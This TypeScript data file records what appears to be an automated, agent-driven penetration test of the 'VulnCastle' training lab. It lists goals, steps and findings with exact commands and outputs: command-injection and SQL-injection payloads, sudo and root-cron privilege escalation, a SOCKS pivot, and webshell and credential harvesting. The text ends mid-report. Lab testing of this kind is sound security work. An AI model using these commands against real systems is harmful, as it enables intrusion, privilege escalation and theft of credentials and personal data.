// Generated from an accepted FGS Blackboard run (VulnCastle lab). All credentials redacted.
import type { FGSGraph, FGSStatus, FGSReport, FGSNode } from "./fgsTypes";

export const fgsGraph: FGSGraph = {
  "revision": 12,
  "nodes": [
    {
      "key": "goal:compromise-dmz",
      "type": "goal",
      "version": 3,
      "state": "done",
      "title": "Compromise DMZ hosts",
      "summary": "Success criteria met: web-01 (172.20.1.10) rooted via sudo find (uid=0 verified) plus command injection, LFI, upload and world-writable root cron vectors; mail-01 (172.20.1.11) rooted via devuser NOPASSWD sudo python3 (uid=0 verified), and its webmail leaked mailbox/env credentials. Both DMZ hosts exploited beyond foot…",
      "success_criteria": "DMZ hosts web-01 (172.20.1.10) and mail-01 (172.20.1.11) exploited beyond initial foothold, with local privilege escalation, credential harvesting, and evidence.",
      "parent_goal": "goal:penetrate-vulncastle",
      "facts": [
        "fact:web01-privesc",
        "fact:web01-creds",
        "fact:mail01-webmail-vulns",
        "fact:mail01-root-privesc"
      ]
    },
    {
      "key": "goal:compromise-internal",
      "type": "goal",
      "version": 3,
      "state": "done",
      "title": "Compromise internal network hosts",
      "summary": "Success criteria met for all four internal hosts: app-01 rooted via unauthenticated command injection (uid=0 live) with LFI/SSRF and durable root SSH; db-01 DB-root-equivalent (ALL PRIVILEGES) with root password recovered, PII and cross-host service credentials dumped (host OS access n/a: SSH closed, mysqld uid 999, UD…",
      "success_criteria": "Each reachable internal host (app-01 10.10.0.13, db-01 10.10.0.14, file-01 10.10.0.15, admin-01 10.10.0.16) is enumerated, its vulnerabilities exploited, additional credentials/access obtained, and privilege escalation demonstrated where possible, with evidence.",
      "parent_goal": "goal:penetrate-vulncastle",
      "facts": [
        "fact:app01-root-rce",
        "fact:db01-service-accounts",
        "fact:file01-samba-vuln",
        "fact:admin01-root",
        "fact:admin01-panel"
      ]
    },
    {
      "key": "goal:penetrate-vulncastle",
      "type": "goal",
      "version": 3,
      "state": "done",
      "title": "Penetrate VulnCastle lab and record findings",
      "summary": "Success criteria met: entry points 8080/8025/2222 were enumerated and exploited (web-01 and mail-01 rooted; SSH gateway landed on the dual-homed pivot), pivoting into DMZ 172.20.1.0/24 and internal 10.10.0.0/24 was achieved through vpn-gw-01 with a verified host/service map, privilege escalation was performed (root on…",
      "success_criteria": "Entry points (web 8080, webmail 8025, ssh 2222) enumerated and exploited, pivot into DMZ 172.20.1.0/24 and internal 10.10.0.0/24 achieved, privilege escalation performed on lab hosts, and all findings recorded with evidence.",
      "facts": [
        "fact:pivot-network-map",
        "fact:web01-rce",
        "fact:app01-api-leak",
        "fact:final-report"
      ]
    },
    {
      "key": "goal:pivot-internal",
      "type": "goal",
      "version": 3,
      "state": "done",
      "title": "Establish dual-network pivot",
      "summary": "Success criteria met: vpn-gw-01 (dual-homed 172.20.1.12 / 10.10.0.12) is rooted (uid=0 via sysadmin NOPASSWD sudo socat), a SOCKS5 pivot from the sandbox is live and re-verified reaching both DMZ and internal services (HTTP 200), and the full host/service map for 172.20.1.0/24 and 10.10.0.0/24 is recorded.",
      "success_criteria": "Root or equivalent access on a dual-homed host and a working SOCKS/relay pivot from the sandbox into both DMZ 172.20.1.0/24 and internal 10.10.0.0/24, with a verified host/service map.",
      "parent_goal": "goal:penetrate-vulncastle",
      "facts": [
        "fact:pivot-verified"
      ]
    },
    {
      "key": "goal:record-findings",
      "type": "goal",
      "version": 3,
      "state": "done",
      "title": "Record all findings with evidence",
      "summary": "Success criteria met: graph/data/FINDINGS.md consolidates every vulnerability, recovered credential, pivot, privilege escalation and host access, each backed by raw evidence under graph/data and by accepted Facts.",
      "success_criteria": "All vulnerabilities, credentials, pivots, privilege escalations, and host accesses are recorded as Facts with supporting result files under graph/data.",
      "parent_goal": "goal:penetrate-vulncastle",
      "facts": [
        "fact:findings-index"
      ]
    },
    {
      "key": "step:exploit-admin-01",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Exploit admin-01 (10.10.0.16): test unauthenticated Redis on 6379 for RCE/credential theft, and attack the Admin Panel on 8080 (/login) with the leaked service api_key and any harvested creds. Goal: admin/root access on admin-01.",
      "reason": "admin-01 exploited to root (world-writable root cron -> SUID root bash + root SSH key, verified euid=0 live). Unauthenticated Redis (CONFIG write as root) and Admin Panel SQLi auth bypass verified. Redis-RDB RCE and flag files recorded as honest negatives.",
      "goal": "goal:compromise-internal",
      "outputs": [
        "fact:admin01-root",
        "fact:admin01-panel"
      ],
      "inputs": [
        "fact:app01-api-leak",
        "fact:pivot-network-map"
      ]
    },
    {
      "key": "step:exploit-app-01",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Exploit app-01 (10.10.0.13:3000) Node API: leverage /api/users api_key, LFI/path traversal via /api/files?name=, SSRF via /api/fetch?url=, and command execution/diagnostics; obtain shell/creds and read app config.",
      "reason": "app-01 fully compromised: unauthenticated root command injection at POST /api/diagnostics (verified uid=0 live), durable root SSH persistence verified, LFI/SSRF/IDOR and leaked api_key recovered. Negative result recorded: no flag material on app-01.",
      "goal": "goal:compromise-internal",
      "outputs": [
        "fact:app01-root-rce"
      ],
      "inputs": [
        "fact:app01-api-leak",
        "fact:pivot-network-map"
      ]
    },
    {
      "key": "step:exploit-db-01",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Exploit db-01 (10.10.0.14:3306 MariaDB): use app_user/••• and/or service api_key to authenticate, enumerate databases/tables, dump credential material (e.g. password hashes, app secrets), and attempt OS-level access via database features if available.",
      "reason": "db-01 DB-layer fully compromised (root-equivalent, root password recovered), PII and cross-host service credentials dumped. Host OS access n/a (SSH closed, mysqld uid 999, UDF blocked) - recorded as negative, not as failure of the DB objective.",
      "goal": "goal:compromise-internal",
      "outputs": [
        "fact:db01-service-accounts"
      ],
      "inputs": [
        "fact:web01-rce",
        "fact:app01-api-leak",
        "fact:pivot-network-map"
      ]
    },
    {
      "key": "step:exploit-file-01",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Exploit file-01 (10.10.0.15) Samba 139/445: enumerate shares (incl. null/guest and service api_key creds), retrieve and write files, harvest credentials/config, and attempt access to the host via Samba features or harvested SSH creds.",
      "reason": "file-01 exploited: null/guest SMB enumeration, confidential share read via sysadmin/•••, harvested MSSH creds, four SSH footholds on file-01. Root not achieved (recorded as negative). Also corrected the disproved smbadmin access claim from fact:db01-service-accounts.",
      "goal": "goal:compromise-internal",
      "outputs": [
        "fact:file01-samba-vuln"
      ],
      "inputs": [
        "fact:app01-api-leak",
        "fact:pivot-network-map"
      ]
    },
    {
      "key": "step:exploit-mail-01",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Enumerate and exploit mail-01 (172.20.1.11) ACME Webmail on :8025 (login form at 172.17.0.1:8025 and 172.20.1.11:8025): discover endpoints/version, test auth bypass, SQLi, SSTI, default/weak creds, and mail content for credentials; escalate and pivot.",
      "reason": "mail-01 compromised to root (devuser NOPASSWD sudo python3, verified uid=0 live). Webmail unauth /inbox and /debug env leaks verified, credentials harvested. Honest negatives: no SQLI/SSTI/LFI in webmail; no flag on mail-01.",
      "goal": "goal:compromise-dmz",
      "outputs": [
        "fact:mail01-webmail-vulns",
        "fact:mail01-root-privesc"
      ],
      "inputs": [
        "fact:pivot-network-map"
      ]
    },
    {
      "key": "step:exploit-web-01",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Own web-01 (172.20.1.10) fully: from www-data RCE/LFI, enumerate app source, config and DB creds, harvest credentials, achieve local privesc to root, and use web-01 as a secondary pivot. Write result file and evidence.",
      "reason": "web-01 root compromise verified live (sudo find -> uid=0), multiple independent vectors and root persistence recorded. DMZ web-01 objective met.",
      "goal": "goal:compromise-dmz",
      "outputs": [
        "fact:web01-privesc",
        "fact:web01-creds"
      ],
      "inputs": [
        "fact:web01-rce",
        "fact:pivot-network-map"
      ]
    },
    {
      "key": "step:final-report",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Produce the final penetration-test report fact for the main goal, citing the entry-point exploitation, pivot, network map, and privilege escalations.",
      "reason": "Final report fact recorded.",
      "goal": "goal:penetrate-vulncastle",
      "outputs": [
        "fact:final-report"
      ]
    },
    {
      "key": "step:findings-index",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Compile the consolidated findings index (hosts, vulnerabilities, credentials, access, negatives, evidence paths) as a durable deliverable and mark the findings objective complete.",
      "reason": "Consolidated findings deliverable compiled and accepted as fact:findings-index; evidence map recorded.",
      "goal": "goal:record-findings",
      "outputs": [
        "fact:findings-index"
      ]
    },
    {
      "key": "step:pivot-establish",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Establish the pivot: SSH sysadmin@172.17.0.1:2222 -> vpn-gw-01, escalate to root via NOPASSWD sudo socat, set up a dynamic SSH SOCKS5 forward from sandbox, and enumerate routes/DMZ+internal reachability from vpn-gw-01.",
      "reason": "SOCKS pivot verified (curl through 127.0.0.1:1080 reached internal web/API services 200). Root on vpn-gw-01 verified (uid=0). DMZ and internal host/port maps collected with naabu. Pivot goal success criteria met.",
      "goal": "goal:penetrate-vulncastle",
      "outputs": [
        "fact:pivot-network-map",
        "fact:app01-api-leak"
      ],
      "inputs": []
    },
    {
      "key": "step:pivot-host-enum",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Enumerate local accounts, reuse-candidates and privesc paths on the rooted pivot vpn-gw-01 (entry SSH gateway 172.17.0.1:2222).",
      "reason": "Pivot host local accounts enumerated; no additional privesc needed (root already held via sysadmin sudo socat). Result recorded.",
      "goal": "goal:pivot-internal",
      "outputs": [],
      "inputs": []
    },
    {
      "key": "step:preflight-recon",
      "type": "step",
      "version": 2,
      "state": "done",
      "action": "Preflight and enumerate entry points: probe web 8080, webmail 8025, ssh 2222; record services, versions, and reachable hosts.",
      "reason": "Entry points 8080/8025/2222 all reachable (200/200/sshd). web-01 OS command injection (?page=ping) and LFI (?page=notes&file=) reproduced live. SSH sysadmin/••• on 172.17.0.1:2222 lands on dual-homed vpn-gw-01 with NOPASSWD sudo socat, reproduced live. Preflight facts remain accurate.",
      "goal": "goal:penetrate-vulncastle",
      "outputs": [
        "fact:web01-rce"
      ]
    },
    {
      "key": "fact:admin01-panel",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "admin-01 Admin Panel (:8080, Python BaseHTTP) has SQL injection in /login password field (query concatenation of username/password, UNION n=4), giving auth bypass: POST /login with username=administrator&password=x' OR '1'='1 -> 302 Location: /dashboard. GET /dashboard is also reachable unauthenticated (broken auth, no…",
      "body": "Exact: curl -x socks5h://127.0.0.1:1080 -i -X POST -d \"username=administrator&password=x' OR '1'='1\" http://10.10.0.16:8080/login -> HTTP/1.0 302 Found, Location: /dashboard. Unauth GET /dashboard -> 200. Evidence: graph/data/step-admin01-*.txt, graph/facts/fact_001-admin01.md.",
      "step": "step:exploit-admin-01"
    },
    {
      "key": "fact:admin01-root",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "admin-01 (10.10.0.16) rooted. Foothold: SSH sysadmin/••• (uid 1000). Privesc: /opt/healthcheck.sh is world-writable (0777, root:root) and executed by root cron every 60s; overwriting it installed an authorized root SSH key and a SUID bash /tmp/rootshell. Root verified live: /tmp/rootshell -p -c id -> uid=1000(sysadmin)…",
      "body": "Evidence: graph/data/step-admin01-privesc-harvest.txt, step-admin01-root-harvest.txt, step-admin01-shell*.txt, graph/facts/fact_001-admin01.md.",
      "step": "step:exploit-admin-01"
    },
    {
      "key": "fact:app01-api-leak",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "app-01 Node API (http://10.10.0.13:3000) leaks data unauthenticated: /api/users returns PII incl. SSN/salary and a service account api_key '•••' with note 'Has access to db-01 and file-01'; /api/health lists internal services db-01.internal:3306, file-01.internal:445, admin-01.internal:6379 (Redis). API also exposes /a…",
      "step": "step:pivot-establish"
    },
    {
      "key": "fact:app01-root-rce",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "app-01 (10.10.0.13) Node API has unauthenticated root command injection at POST /api/diagnostics. server.js runs execSync('nslookup ${target}') unsanitized. {\"target\":\"127.0.0.1|id\"} returns uid=0(root). Verified live.",
      "body": "Exact: curl -s -x socks5h://127.0.0.1:1080 -X POST -H 'Content-Type: application/json' --data '{\"target\":\"127.0.0.1|id\"}' http://10.10.0.13:3000/api/diagnostics -> {\"result\":\"uid=0(root) gid=0(root) groups=0(root)\"}. Endpoint is POST-only (GET 404, OPTIONS Allow: POST); pipe '|' and ';' both work. Evidence: graph/data/step-app01-rce*.txt, graph/data/step-app…",
      "step": "step:exploit-app-01"
    },
    {
      "key": "fact:db01-service-accounts",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "db-01 acme_corp.service_accounts dump (cross-host credential harvest, verified live): smbadmin / ••• -> file-01 Samba (read/write all shares); Redis at admin-01.internal:6379 requires NO auth; backup/••• -> vpn-gw-01 SSH (verified uid 34); administrator / ••• -> admin-01:8080 Admin Panel. Also acme_corp.customers PII:…",
      "body": "Verified via mysql -h127.0.0.1 -P13306 -u root -p'•••' --skip-ssl -e \"SELECT ... FROM acme_corp.service_accounts;\". Full PII in graph/data/step-db01-fullenum.txt. These creds were forwarded to the file-01 and admin-01 execute agents.",
      "step": "step:exploit-db-01"
    },
    {
      "key": "fact:file01-samba-vuln",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "file-01 (10.10.0.15) Samba 4.15.13-Ubuntu (SMB1 min protocol NT1). Null/guest session lists 4 shares: public, confidential, backups, IPC$. public is world-writable (0777) for null/guest; backups is read-only and empty for null; confidential is NT_STATUS_ACCESS_DENIED for null/guest/smbadmin.",
      "body": "smbclient -L //10.10.0.15 -N -> public/confidential/backups/IPC$, comment 'ACME File Server', Workgroup ACMECORP. smb.conf: no force user, wide links=No, SMB1 enabled. Evidence: graph/data/step-file01-enum.txt, step-file01-samba-config.txt, step-file01-shares-direct.txt.",
      "step": "step:exploit-file-01"
    },
    {
      "key": "fact:final-report",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "VulnCastle lab fully penetrated. Entry points all exploited: ACME portal http://172.17.0.1:8080 (web-01, cmd injection/LFI/upload → root), ACME Webmail http://172.17.0.1:8025 (mail-01, unauth /inbox + /debug + sudo python3 → root), and SSH gateway 172.17.0.1:2222 (vpn-gw-01, sysadmin/••• + sudo socat → root). Pivot int…",
      "step": "step:final-report"
    },
    {
      "key": "fact:findings-index",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "Consolidated findings index written to graph/data/FINDINGS.md: 20 vulnerabilities across web-01, mail-01, vpn-gw-01, app-01, db-01, file-01, admin-01 (command injection, LFI, upload, SSRF, IDOR, unauth mailbox/env, sudo/root-cron privesc, DB root-equivalence, Samba share access, unauth Redis with root CONFIG write, pan…",
      "body": "Deliverable: graph/data/FINDINGS.md. All claims are backed by graph/data/step-* evidence transcripts and were independently re-verified live where noted. Findings map to accepted Facts: fact:web01-privesc, fact:web01-creds, fact:mail01-webmail-vulns, fact:mail01-root-privesc, fact:app01-root-rce, fact:app01-root-ssh, fact:app01-api-vulns, fact:db01-root-equi…",
      "step": "step:findings-index"
    },
    {
      "key": "fact:mail01-root-privesc",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "mail-01 local root achieved: devuser/••• (harvested from webmail app.py) logs in over SSH to mail-01 (172.20.1.11:22) and has NOPASSWD sudo on /usr/bin/python3, yielding uid=0(root) via `sudo python3 -c \"import os; os.system('id')\"`. Verified live through SOCKS.",
      "body": "Exact: sshpass -p '•••' proxychains4 -f /task/workdir/proxychains.conf ssh -o ... devuser@172.20.1.11 'echo ••• | sudo -S python3 -c \"import os; os.system(\\\"id; hostname\\\")' -> uid=0(root) gid=0(root) hostname mail-01. sysadmin/••• also works for SSH (uid 1000). No flag file found on mail-01. Evidence: graph/data/step-mail01-root.txt, step-mail01-privesc.txt…",
      "step": "step:exploit-mail-01"
    },
    {
      "key": "fact:mail01-webmail-vulns",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "mail-01 (172.20.1.11) ACME Webmail (:8025, custom Python BaseHTTP) is vulnerable: /inbox is served with NO authentication (full mailbox leak); /debug dumps environment. Leaks VPN creds vpnuser/•••, DB root •••, default password •••, and webmail app.py hardcodes admin/•••, sysadmin/•••, devuser/•••. /debug leaks SECRET_…",
      "body": "curl -s -x socks5h://127.0.0.1:1080 http://172.20.1.11:8025/inbox -> 200 full mailbox (From ceo: VPN creds vpnuser/•••; From devops: db-01 root/•••; From hr: default •••). curl .../debug -> env with SECRET_KEY/SMTP creds. Login POST /login validates a hardcoded creds dict; no SQLi/SSTI/LFI handler reached. Endpoints 404: /mail /api /admin /register /send /co…",
      "step": "step:exploit-mail-01"
    },
    {
      "key": "fact:pivot-network-map",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "Pivot established: SSH dynamic SOCKS5 on sandbox 127.0.0.1:1080 via sysadmin@172.17.0.1:2222 -> vpn-gw-01 (172.20.1.12 / 10.10.0.12). Root on vpn-gw-01 via NOPASSWD `sudo /usr/bin/socat - EXEC:'/bin/bash...'` returns uid=0(root). naabu (nmap broken in sandbox) recovered full DMZ+internal host/port map.",
      "body": "DMZ 172.20.1.0/24: .1:22 (gw), .10:22,80 (web-01 ACME portal), .11:22,8025 (mail-01 webmail), .12:22 (vpn-gw-01, dual-homed pivot). Internal 10.10.0.0/24: .1:22 (gw), .12:22 (vpn-gw-01), .13:22,3000 (app-01 Node API), .14:3306 (db-01 MariaDB), .15:22,139,445 (file-01 Samba), .16:22,6379 (admin-01 Redis), .16:8080 (admin-01 Admin Panel). Scans: graph/data/naa…",
      "step": "step:pivot-establish"
    },
    {
      "key": "fact:pivot-verified",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "Pivot re-verified live: SOCKS5 on 127.0.0.1:1080 (SSH dynamic forward via sysadmin@172.17.0.1:2222 to vpn-gw-01, dual-homed 172.20.1.12 / 10.10.0.12) returns HTTP 200 for internal app-01 (10.10.0.13:3000) and for DMZ web-01 (172.20.1.10:80), and naabu through it recovered the full DMZ + internal host/port map. Root on…",
      "body": "Health probes during the run: curl -x socks5h://127.0.0.1:1080 http://10.10.0.13:3000/api/health -> 200; http://172.20.1.10/ -> 200. SOCKS listener and forwards documented in graph/tmux-registry.md. zone map: DMZ .1,.10,.11,.12; internal .1,.12,.13,.14,.15,.16.",
      "step": "step:pivot-host-enum"
    },
    {
      "key": "fact:web01-creds",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "From web-01: hardcoded DB creds app_user / ••• found in /var/www/html/notes/welcome.txt (Host db-01.internal) and leaked via LFI; SSH password reuse backup/••• (uid 34, /bin/bash) and sysadmin/••• (uid 1000) on web-01. /etc/shadow hashes harvested for backup/sysadmin/••• (sysadmin+backup recovered, devuser/deploy crack…",
      "body": "Verified LFI: GET http://172.17.0.1:8080/?page=notes&file=/var/www/html/notes/welcome.txt -> 'Host: db-01.internal / User: app_user / Pass: •••'. backup/••• SSH -> uid=34(backup) on web-01. Evidence: graph/data/web01-shadow-users.txt, step-web01-harvest.txt.",
      "step": "step:exploit-web-01"
    },
    {
      "key": "fact:web01-privesc",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "web-01 (172.20.1.10) fully compromised to root. Vectors: (1) OS command injection POST ?page=ping host=127.0.0.1;id -> www-data (PHP shell_exec on host param); (2) LFI ?page=notes&file=; (3) unrestricted file upload into /var/www/html/uploads (dir 0777, nginx autoindex) -> webshell; (4) SSH password reuse sysadmin/•••…",
      "body": "Verified: sshpass -p ••• proxychains4 ssh sysadmin@172.20.1.10 'sudo -n /usr/bin/find / -maxdepth 0 -exec /bin/bash -c \"id; hostname\"' -> uid=0(root) web-01. Src: shell_exec(\"ping -c 3 \".$host) in index.php. Upload uses move_uploaded_file into /var/www/html/uploads (0777). Root key: graph/data/web01_root_key. SUID root bash /tmp/.rb (4755). Evidence: graph/d…",
      "step": "step:exploit-web-01"
    },
    {
      "key": "fact:web01-rce",
      "type": "fact",
      "version": 1,
      "state": "done",
      "summary": "ACME portal on web-01 (172.20.1.10) is vulnerable to OS command injection on ?page=ping (uid=33 www-data) and arbitrary file read via ?page=notes&file= (LFI), leaking /etc/passwd and app_user/••• DB creds.",
      "step": "step:preflight-recon"
    }
  ],
  "edges": [
    {
      "from": "fact:admin01-panel",
      "relation": "satisfies",
      "to": "goal:compromise-internal"
    },
    {
      "from": "fact:admin01-root",
      "relation": "satisfies",
      "to": "goal:compromise-internal"
    },
    {
      "from": "fact:app01-api-leak",
      "relation": "satisfies",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "fact:app01-root-rce",
      "relation": "satisfies",
      "to": "goal:compromise-internal"
    },
    {
      "from": "fact:db01-service-accounts",
      "relation": "satisfies",
      "to": "goal:compromise-internal"
    },
    {
      "from": "fact:file01-samba-vuln",
      "relation": "satisfies",
      "to": "goal:compromise-internal"
    },
    {
      "from": "fact:final-report",
      "relation": "satisfies",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "fact:findings-index",
      "relation": "satisfies",
      "to": "goal:record-findings"
    },
    {
      "from": "fact:mail01-root-privesc",
      "relation": "satisfies",
      "to": "goal:compromise-dmz"
    },
    {
      "from": "fact:mail01-webmail-vulns",
      "relation": "satisfies",
      "to": "goal:compromise-dmz"
    },
    {
      "from": "fact:pivot-network-map",
      "relation": "satisfies",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "fact:pivot-verified",
      "relation": "satisfies",
      "to": "goal:pivot-internal"
    },
    {
      "from": "fact:web01-creds",
      "relation": "satisfies",
      "to": "goal:compromise-dmz"
    },
    {
      "from": "fact:web01-privesc",
      "relation": "satisfies",
      "to": "goal:compromise-dmz"
    },
    {
      "from": "fact:web01-rce",
      "relation": "satisfies",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "goal:compromise-dmz",
      "relation": "part_of",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "goal:compromise-internal",
      "relation": "part_of",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "goal:pivot-internal",
      "relation": "part_of",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "goal:record-findings",
      "relation": "part_of",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "step:exploit-admin-01",
      "relation": "produces",
      "to": "fact:admin01-panel"
    },
    {
      "from": "step:exploit-admin-01",
      "relation": "produces",
      "to": "fact:admin01-root"
    },
    {
      "from": "step:exploit-admin-01",
      "relation": "toward",
      "to": "goal:compromise-internal"
    },
    {
      "from": "step:exploit-admin-01",
      "relation": "uses",
      "to": "fact:app01-api-leak"
    },
    {
      "from": "step:exploit-admin-01",
      "relation": "uses",
      "to": "fact:pivot-network-map"
    },
    {
      "from": "step:exploit-app-01",
      "relation": "produces",
      "to": "fact:app01-root-rce"
    },
    {
      "from": "step:exploit-app-01",
      "relation": "toward",
      "to": "goal:compromise-internal"
    },
    {
      "from": "step:exploit-app-01",
      "relation": "uses",
      "to": "fact:app01-api-leak"
    },
    {
      "from": "step:exploit-app-01",
      "relation": "uses",
      "to": "fact:pivot-network-map"
    },
    {
      "from": "step:exploit-db-01",
      "relation": "produces",
      "to": "fact:db01-service-accounts"
    },
    {
      "from": "step:exploit-db-01",
      "relation": "toward",
      "to": "goal:compromise-internal"
    },
    {
      "from": "step:exploit-db-01",
      "relation": "uses",
      "to": "fact:app01-api-leak"
    },
    {
      "from": "step:exploit-db-01",
      "relation": "uses",
      "to": "fact:pivot-network-map"
    },
    {
      "from": "step:exploit-db-01",
      "relation": "uses",
      "to": "fact:web01-rce"
    },
    {
      "from": "step:exploit-file-01",
      "relation": "produces",
      "to": "fact:file01-samba-vuln"
    },
    {
      "from": "step:exploit-file-01",
      "relation": "toward",
      "to": "goal:compromise-internal"
    },
    {
      "from": "step:exploit-file-01",
      "relation": "uses",
      "to": "fact:app01-api-leak"
    },
    {
      "from": "step:exploit-file-01",
      "relation": "uses",
      "to": "fact:pivot-network-map"
    },
    {
      "from": "step:exploit-mail-01",
      "relation": "produces",
      "to": "fact:mail01-root-privesc"
    },
    {
      "from": "step:exploit-mail-01",
      "relation": "produces",
      "to": "fact:mail01-webmail-vulns"
    },
    {
      "from": "step:exploit-mail-01",
      "relation": "toward",
      "to": "goal:compromise-dmz"
    },
    {
      "from": "step:exploit-mail-01",
      "relation": "uses",
      "to": "fact:pivot-network-map"
    },
    {
      "from": "step:exploit-web-01",
      "relation": "produces",
      "to": "fact:web01-creds"
    },
    {
      "from": "step:exploit-web-01",
      "relation": "produces",
      "to": "fact:web01-privesc"
    },
    {
      "from": "step:exploit-web-01",
      "relation": "toward",
      "to": "goal:compromise-dmz"
    },
    {
      "from": "step:exploit-web-01",
      "relation": "uses",
      "to": "fact:pivot-network-map"
    },
    {
      "from": "step:exploit-web-01",
      "relation": "uses",
      "to": "fact:web01-rce"
    },
    {
      "from": "step:final-report",
      "relation": "produces",
      "to": "fact:final-report"
    },
    {
      "from": "step:final-report",
      "relation": "toward",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "step:findings-index",
      "relation": "produces",
      "to": "fact:findings-index"
    },
    {
      "from": "step:findings-index",
      "relation": "toward",
      "to": "goal:record-findings"
    },
    {
      "from": "step:pivot-establish",
      "relation": "depends_on",
      "to": "step:preflight-recon"
    },
    {
      "from": "step:pivot-establish",
      "relation": "produces",
      "to": "fact:app01-api-leak"
    },
    {
      "from": "step:pivot-establish",
      "relation": "produces",
      "to": "fact:pivot-network-map"
    },
    {
      "from": "step:pivot-establish",
      "relation": "toward",
      "to": "goal:penetrate-vulncastle"
    },
    {
      "from": "step:pivot-host-enum",
      "relation": "depends_on",
      "to": "step:pivot-establish"
    },
    {
      "from": "step:pivot-host-enum",
      "relation": "produces",
      "to": "fact:pivot-verified"
    },
    {
      "from": "step:pivot-host-enum",
      "relation": "toward",
      "to": "goal:pivot-internal"
    },
    {
      "from": "step:preflight-recon",
      "relation": "produces",
      "to": "fact:web01-rce"
    },
    {
      "from": "step:preflight-recon",
      "relation": "toward",
      "to": "goal:penetrate-vulncastle"
    }
  ]
};

export const fgsStatus: FGSStatus = {
  "action_required": 0,
  "last_accepted_at": "2026-09-28T09:36:56.144462547Z",
  "receipts": [
    {
      "id": "intent_00000011",
      "continuation_id": "c1ec04cf1ce75ce7c666f3103f7558d5",
      "state": "applied",
      "revision": 12
    },
    {
      "id": "intent_00000010",
      "continuation_id": "c1ec04cf1ce75ce7c666f3103f7558d5",
      "state": "applied",
      "revision": 11
    },
    {
      "id": "intent_00000009",
      "continuation_id": "c1ec04cf1ce75ce7c666f3103f7558d5",
      "state": "applied",
      "revision": 10
    },
    {
      "id": "intent_00000008",
      "continuation_id": "c1ec04cf1ce75ce7c666f3103f7558d5",
      "state": "superseded",
      "revision": 9,
      "message": "completion Fact belongs to another Goal. No operations from this update were applied. Read accepted state and resend the complete corrected batch."
    },
    {
      "id": "intent_00000007",
      "continuation_id": "c1ec04cf1ce75ce7c666f3103f7558d5",
      "state": "applied",
      "revision": 9
    },
    {
      "id": "intent_00000006",
      "continuation_id": "c1ec04cf1ce75ce7c666f3103f7558d5",
      "state": "applied",
      "revision": 8
    }
  ]
};

export const fgsReport: FGSReport = {"revision":12,"markdown":"# vulncastle\n\nAccepted revision: 12\n\n## Compromise DMZ hosts\n\nGoal: goal:compromise-dmz · done\n\nSuccess criteria: DMZ hosts web-01 (172.20.1.10) and mail-01 (172.20.1.11) exploited beyond initial foothold, with local privilege escalation, credential harvesting, and evidence.\n\nParent Goal: goal:penetrate-vulncastle\n\nSuccess criteria met: web-01 (172.20.1.10) rooted via sudo find (uid=0 verified) plus command injection, LFI, upload and world-writable root cron vectors; mail-01 (172.20.1.11) rooted via devuser NOPASSWD sudo python3 (uid=0 verified), and its webmail leaked mailbox/env credentials. Both DMZ hosts exploited beyond foothold, credentials harvested, evidence recorded.\n\nSupporting Facts: fact:web01-privesc, fact:web01-creds, fact:mail01-webmail-vulns, fact:mail01-root-privesc\n\n### Enumerate and exploit mail-01 (172.20.1.11) ACME Webmail on :8025 (login form at 172.17.0.1:8025 and 172.20.1.11:8025): discover endpoints/version, test auth bypass, SQLi, SSTI, default/weak creds, and mail content for credentials; escalate and pivot.\n\nStep: step:exploit-mail-01 · done\n\nReason: mail-01 compromised to root (devuser NOPASSWD sudo python3, verified uid=0 live). Webmail unauth /inbox and /debug env leaks verified, credentials harvested. Honest negatives: no SQLI/SSTI/LFI in webmail; no flag on mail-01.\n\n#### mail-01 local root achieved: devuser/••• (harvested from webmail app.py) logs in over SSH to mail-01 (172.20.1.11:22) and has NOPASSWD sudo on /usr/bin/python3, yielding uid=0(root) via `sudo python3 -c \"import os; os.system('id')\"`. Verified live through SOCKS.\n\nFact: fact:mail01-root-privesc\n\nExact: sshpass -p '•••' proxychains4 -f /task/workdir/proxychains.conf ssh -o ... devuser@172.20.1.11 'echo ••• | sudo -S python3 -c \"import os; os.system(\\\"id; hostname\\\")' -> uid=0(root) gid=0(root) hostname mail-01. sysadmin/••• also works for SSH (uid 1000). No flag file found on mail-01. Evidence: graph/data/step-mail01-root.txt, step-mail01-privesc.txt.\n\nData references: graph/data/step-mail01-root.txt, graph/data/step-mail01-privesc.txt\n\n#### mail-01 (172.20.1.11) ACME Webmail (:8025, custom Python BaseHTTP) is vulnerable: /inbox is served with NO authentication (full mailbox leak); /debug dumps environment. Leaks VPN creds vpnuser/•••, DB root •••, default password •••, and webmail app.py hardcodes admin/•••, sysadmin/•••, devuser/•••. /debug leaks SECRET_KEY=•••, SMTP_USER=admin, SMTP_PASS=••• Verified live twice.\n\nFact: fact:mail01-webmail-vulns\n\ncurl -s -x socks5h://127.0.0.1:1080 http://172.20.1.11:8025/inbox -> 200 full mailbox (From ceo: VPN creds 